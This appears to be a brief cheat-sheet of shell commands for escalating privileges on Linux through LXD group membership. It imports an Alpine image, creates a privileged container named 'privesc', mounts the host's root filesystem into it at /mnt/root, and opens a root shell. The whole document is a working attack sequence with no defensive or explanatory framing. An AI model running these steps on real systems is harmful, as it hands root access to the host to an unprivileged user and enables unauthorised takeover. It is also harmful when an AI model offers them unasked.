```
Download lxd.tar.xz and rootfs.squashfs from : [https://images.lxd.canonical.com/]()

lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list 

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list 

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc exec privesc su
```